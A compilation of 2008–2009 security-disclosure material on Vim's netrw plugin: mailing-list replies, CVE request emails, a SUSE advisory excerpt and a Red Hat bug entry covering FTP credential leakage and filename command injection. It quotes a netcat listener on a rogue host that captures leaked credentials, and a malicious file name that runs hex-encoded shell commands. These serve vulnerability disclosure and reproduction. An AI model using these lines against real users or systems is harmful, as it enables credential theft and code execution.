I'm sure Charles is thinking of a solution. But it's a really minor
issue, it's hard to imagine this could be used to intentionally obtain
login name and password. It's more that it might happen accidentally.
Just like you may type the right password at the wrong site.

I agree, but I have to do something to fix this as I'm the NetBSD pkgsrc
maintainer for vim and I get daily warning about this...

"fixed" indeed:

You check that the domain name has changed, but not the TCP port. An
FTP server on the same host, but a different port name has no business
knowing the credentials of the other server. This allows for example
collecting credentials of local users -- an FTP server set up by a
mere user will be sent credentials for the FTP server set up by root
(i.e., real user names + passwords for this machine):

FTP server set up by root:

ftp://rdancer@localhost/

FTP server set up by a mere user:

ftp://localhost:31337/

You may also want to read the advisory. It's there, right at the top:

``Once vim successfully connects to an FTP server using a user name and
 password credentials, it will re-use them in all subsequent FTP
 sessions, regardless of the domain name or TCP port.''
 ^^^^^^^^

Cheers,
Jan.

don't, then I'm assuming that they're using the same id and password on
that unchanged hostname, deliberately. A typical situation would be when
the user forgot to use the non-standard port number and wishes to redo
the transaction but with the correct port.

Yes. Now that it has been shown that this is in fact insecure, and
can lead to credentials disclosure in the very environment where FTP
is secure overall (over local loopback, no snooping possible), it's
perhaps time to forgo that assumption. Requiring users to use
NetUserPass() is ridiculous.

Cheers,
Jan.

Ftp basically is an insecure protocol. It sends passwords out in the
open over the internet. Perhaps there is a specific way in which nobody
will be able to spot the password, but this is too complicated for most
users to understand. In general the statement is not to use ftp for
something where you don't want to take a risc of giving away your
password.

Trying to put a secure layer op top of an insecure protocol doesn't make
much sense. We can only try to avoid the most common mistakes a user
might make. But the general recommendation must still be not to use ftp
for things that should be secure.

Subject: CVE request - (vim : netrw plugin - ftp user
 credentials disclosure)

Hello Steve,

  could you please allocate a new CVE id for the following
Vim issue:

Vulnerability reports: 1, <http://www.rdancer.org/vulnerablevim-netrw-credentials-dis.html>
                          (This is another issue than CVE-2008-2712).

                       2, <https://bugzilla.redhat.com/show_bug.cgi?id=461750>

Thread discussing this issue:

<http://groups.google.com/group/vim_dev/browse_thread/thread/2f6fad581a037971/a5fcf4c4981d34e6?show_docid=a5fcf4c4981d34e6>

Proposed partial fix:

<http://mysite.verizon.net/astronaut/vim/index.html#NETRW>

Affected Vim netrw plugin versions:
    a, Vim 7.0 autoloaded netrw plugin versions - from " Date: Jul 24, 2006, Version: 102" till the latest.
    b, older versions of Vim netrw may be also affected.

Testcase available at:

<http://www.rdancer.org/vulnerablevim-netrw-credentials-dis.html> (part 4. EXPLOIT)

Note: Slightly modification of the testcase in the "netcat" part may be needed
      to successfully reproduce the issue. I was using:

      printf '220\r\n331\r\n' | nc -l ftp.rogue.example.com 31337 > credentials&
      (and for simulation of successful FTP session login the command:
      printf '220\r\n331\r\n230\r\n' | nc -l ftp.rogue.example 31337 > credentials &)

Thanks, Jan

Subject: CVE request - Vim netrw.plugin

Hello Steve,

  summarizing till today known information about the Vim netrw.vim
plugin issues.

1. issue:
=========

* Original advisories: <http://www.rdancer.org/vulnerablevim-netrw.html>
                       <http://www.rdancer.org/vulnerablevim-netrw.v2.html>

* CVE id: CVE-2008-3076 already used in rPath advisory
          <http://www.openwall.com/lists/oss-security/2008/07/10/7>

* Testcases: netrw.v2 (the 'mz' command issue)
             netrw.v3 (the 'mc' command issue)
             netrw.v4 (the "D' command issue)

* Steps to reproduce:

  1, The 'mz' command (testcase netrw.v2)
     a, Open directory containing a file with malicious name
     b, Point the cursor to line with this file
     c, In Vim shell type  ":normal mfmz" (selects this file to be compressed/decompressed)
     d, Close Vim ":q"

     Result: In vulnerable Vim versions file isn't (de)compressed and "pwned" file is
             created.

     Affected Vim versions: Vim 7.2alpha+
     Not affected Vim versions:
       -- Vim 7.0, 7.1 affected only in case you manually reinstall
          older version of netrw.vim via vimball.
                            manually reinstall older (vul
       -- Vim 6.0 not affected (netrw.vim not shipped there).
     Affected netrw.vim plugin versions: 111 <= x <= 123

     Proposed solution: Should stay as a part of CVE-2008-3076.

   2, The 'mc' command (testcase netrw.v3)
      a, Open directory containing a file with malicious name
      b, Select some directory as move/copy target (moving via ../)
      c, Mark this directory as move/copy target, i.e in Vim
         shell perform command ":normal mfmt"
         (new line containing "Copy/Move Tgt: selected_directory"
          should appear)
      d, In Vim return to directory containing file with malicious
         filename
      e, Point the cursor to line containing this filename
      f, In Vim perform copy command, i.e. in Vim shell
         "normal mfmc"
      g, Close Vim ":q"

      Result: Vulnerable Vim and netrw.vim versions don't copy the file,
              "pwned" file is created.

      Affected Vim versions: Vim 7.2alpha+
      Not affected Vim versions:
        -- Vim 7.0, Vim 7.1 affected only in case you manually reinstall
           older version of netrv.vim via vimball.
        -- Vim 6.0 not affected (netrw.vim not shipped there).
      Affected netrw.vim plugin versions: 113 <= x <= 122

      Proposed solution: Should stay as a part of CVE-2008-3076.

   3, The 'D' command (testcase netrw.v4)
      a, Open directory containing a file with malicious name
      b, Point the cursor to the "executable' part of the
         filename (i.e. "eval `echo 0:64617465203e3e2070776e6564 | xxd -r`)
      c, Press the 'D' key
      d, Confirm the deletion request with 'y'.
      e, Close Vim ":q"

      Result: Vulnerable Vim and netrw.vim versions don't delete the file,
              "pwned" file is created.

      Affected Vim versions: Vim 7.0, Vim 7.1 (affected every time,
                             no manual reinstallation of older netrw.vim
                             plugin needed).
      Not affected Vim versions:
        -- Vim.6.0 (netrw.vim not shipped there).
        -- Vim 7.2 (already fixed).
      Affected vim.netrw plugin versions: 102 <= x <= 123

      Proposed solution: Should be split into a new CVE id (and possibly
                         merged with netrw.v5 issue as it affects Vim 7.0,
                         Vim 7.1 and is fixed in Vim 7.2 as the netrw.v5 issue).

* Action: Formulate CVE-2008-3076 as covering the 'mz' and 'mc' command issues.
          Merge the 'D' command issue with new CVE id allocated to netrw.v5
          issue (as both of these issues affect Vim 7.0, 7.1 and are already
          fixed in Vim 7.2).

* References: <http://www.rdancer.org/vulnerablevim-netrw.html>
              <http://www.rdancer.org/vulnerablevim-netrw.v2.html>

2. issue:
=========

* Original advisory: <http://www.rdancer.org/vulnerablevim-netrw.v5.html>
                     <http://www.rdancer.org/vulnerablevim-netrw.v2.html> (the 'D' command part)

* CVE id: Still needs a new CVE id

* Testcase: netrw.v5

* Affected Vim versions: Vim 7.0, Vim 7.1
  Not affected Vim versions:
    -- Vim 6.0 (netrw.vim not shipped there)
    -- Vim 7.2 (already fixed)

* Action: Allocate a new CVE id, merge the description with the 'D' command issue
          from the CVE-2008-3076 issue.

* References: <http://www.rdancer.org/vulnerablevim-netrw.v5.html>

3. issue:
=========

* Original advisory:  <http://www.rdancer.org/vulnerablevim-netrw-credentials-dis.html>
* CVE id: Still needs a new CVE id

* Testcase: Available in original advisory, part "4. EXPLOIT"

* Affected Vim versions: Vim 7.1, Vim 7.2
  Affected vim.netrw versions: <= 131

* Thread disccusing this issue: <http://groups.google.com/group/vim_dev/browse_thread/thread/2f6fad581a037971/a5fcf4c4981d34e6?show_docid=a5fcf4c4981d34e6>
* Proposed patch: <http://mysite.verizon.net/astronaut/vim/index.html#NETRW>

* Action: Allocate a new CVE id describing this issue.

* References:  <http://www.rdancer.org/vulnerablevim-netrw-credentials-dis.html>

Other netrw issues:
==================

CVE-2008-3432 <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3432>
Affects: Vim 6.2, 6.3 (others not affected)

Hope has answered questions from: <http://www.openwall.com/lists/oss-security/2008/08/01/1>

Steve, could you please:  1, join netrw 'mz' and 'mc' commnad issues under CVE-2008-3076,
                          2, allocate a new CVE id and merge the 'D' command issue and
                             netrw.v5 issue under this new CVE (as these two both affect
                             Vim 7.0 and 7.1) and
                          3, allocate a new CVE id for the Vim netrw: FTP user credentials
                             disclosure issue?

Jan, your comments are appreciated.

Regards, Jan.

server and via the YaST Online Update.
- vim, gvim
The VI Improved editor (vim) was prone to several security problems:
CVE-2008-4677: The netrw plugin sent credentials to all servers.
CVE-2008-2712: Arbitrary code execution in vim helper plugins
filetype, zip, xpm, gzip and netrw.
CVE-2008-3074: tarplugin code injection
CVE-2008-3075: zipplugin code injection
CVE-2008-3076: several netrw bugs, code injection
CVE-2008-6235: code injection in the netrw plugin
CVE-2008-4677: credential disclosure by netrw plugin
Affected Products: openSUSE 10.3-11.1, SLES9, SLES10
On openSUSE vim was upgraded to version 7.2.108 to fix those issues.
SLES9 and 10 were only affected by a subset, patches were backported
to fix the problems.
- apache2
A DoS condition in apache2's mod\_proxy has been fixed
(CVE-2008-2364).
Affected Products: openSUSE 10.3
- opera
Opera 9.64 is a recommended security and stability upgrade,
incorporating the Opera Presto 2.1.1 user agent engine. Opera highly
recommends all users to upgrade to Opera 9.64 to take advantage of
these improvements (CVE-2009-0914, CVE-2009-0915, CVE-2009-0916).
A detailed changelog can be found at
<http://www.opera.com/docs/changelogs/linux/964/>
- multipath tools
/var/run/multipathd.sock was world-writable allowing local users to
issue commands to the multipath daemon (CVE-2009-0115).
Affected Products: openSUSE 10.3-11.0, SLES10
- java-1\_6\_0-openjdk
Specially crafted image files could cause an integer overflow in the
lcms library contained in openjdk. Attackers could potentially
exploit that to crash applications using lcms or even execute
arbitrary code (CVE-2009-0723, CVE-2009-0581, CVE-2009-0733).
Previous update packages contained broken dependencies and couldn't
be installed. Therefore the update had to be re-released.
Affected Products: openSUSE 11.0 and 11.1
- imp
Version update to IMP 4.1.6 fixes a problem with validating HTTP requests that
allowed attackers to delete emails (CVE-2007-6018) and some
cross-site-scripting issues (CVE-2009-0930).
Affected Products: openSUSE 10.3-11.0
- horde
Version update to horde 3.1.9 fixes a cross-site-scripting (XSS) issue
(CVE-2008-5917) and an include file problem (CVE-2009-0932).
Affected Products: openSUSE 10.3-11.0
- lcms
Specially crafted image files could cause an integer overflow in
lcms. Attackers could potentially exploit that to crash applications
using lcms or even execute arbitrary code (CVE-2009-0723,
CVE-2009-0581, CVE-2009-0733).
Affected Products: openSUSE 10.3-11.1, SLES9, SLES10
- moodle
moodle was prone to several cross-site-scripting (XSS) and
cross-site-request-forgery (CSRF) problems (CVE-2009-0499, CVE-2009-0500,
CVE-2009-0501, CVE-2009-0502).
Affected Products: openSUSE 10.3-11.0
- ghostscript
Integer overflows and missing upper bounds checks in Ghostscript's
ICC library potentially allowed attackers to crash Ghostscript or
even cause execution of arbitrary code via specially crafted PS or
PDF files (CVE-2009-0583, CVE-2009-0584).
Affected Products: openSUSE 10.3-11.0, SLES9, SLES10

2) Pending Vulnerabilities, Solutions, and Work-Arounds
- NetworkManager
The NetworkManager update caused WLAN to stop working on some
systems. Those systems most likely have a stale directory
/var/run/dbus/at\_console/root. It's most likely a leftover from a
root session. Removing the directory and restarting networking
should fix the problems. Please avoid logging in as root in the future.

3) Authenticity Verification and Additional Information
- Announcement authenticity verification:
SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file containing the announcement.
The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and integrity of a
package needs to be verified to ensure that it has not been tampered with.
The internal RPM package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on RPMv4-based
distributions) and the gpg key ring of 'root' during installation. You can
also find it on the first installation CD and included at the end of this
announcement.
- SUSE runs two security mailing lists to which any interested party may
subscribe:
opensuse-security@opensuse.org
- General Linux and SUSE security discussion.
All SUSE security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security+subscribe@opensuse.org>.
opensuse-security-announce@opensuse.org
- SUSE's announce-only mailing list.
Only SUSE's security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security-announce+subscribe@opensuse.org>.
=====================================================================
SUSE's security contact is <security@suse.com> or <security@suse.de>.

| [Description](show_bug.cgi?id=461750#c0)  Jan Lieskovsky    2008-09-10 12:36:54 UTC  ``` Description of problem (pasted from original rdancer.org vim vulnerability description -- see references):  The Vim Netrw Plugin shares the FTP user name and password across all FTP sessions.  Every time Vim makes a new FTP connection, it sends the user name and password of the previous FTP session to the FTP server.  Once vim successfully connects to an FTP server using a user name and password credentials, it will re-use them in all subsequent FTP sessions, regardless of the domain name or TCP port.  This behaviour is documented, although the documentation states the credentials are ``retained on a per-session basis''.  Apparently the Vim session, not the FTP session:    ``g:netrw_uid      (ftp) user-id,    retained on a per-session basis     s:netrw_passwd   (ftp) password,   retained on a per-session basis''      		-- Netrw Reference Manual (``pi_netrw.txt'')  Although FTP communication is not encrypted and therefore open to eavesdropping, if the access to the network is protected, a credentials-based access control is meaningful, and the credentials must be kept secret.  Version-Release number of selected component (if applicable): 7.1.266, 7.2 and earlier versions of Vim  How reproducible: Always  Steps to Reproduce: 1. See "4. EXPLOIT" from the rdancer vim vulnerability report [1]    Actual results: Credentials disclosure.  Expected results: Credentials are kept secret.  References (rdancer.org vim original vulnerability report):  [1] <http://www.rdancer.org/vulnerablevim-netrw-credentials-dis.html>   ```  [Comment 1](show_bug.cgi?id=461750#c1)  Jan Lieskovsky    2008-10-06 09:03:21 UTC  ``` Link to thread discussing this vulnerability:  <http://groups.google.com/group/vim_dev/browse_thread/thread/2f6fad581a037971/a5fcf4c4981d34e6?show_docid=a5fcf4c4981d34e6>#  Proposed partial fix:  <http://mysite.verizon.net/astronaut/vim/index.html#NETRW>   ```  [Comment 2](show_bug.cgi?id=461750#c2)  Tomas Hoger    2009-01-08 11:12:34 UTC  ``` This issue did not affect the versions of vim as shipped with Red Hat Enterprise Linux 2.1, 3, 4, or 5.   All stable Fedora versions were updated to vim upstream version 7.2.060, which contains netrw plugin version that prompts for new password when connecting to new FTP site.
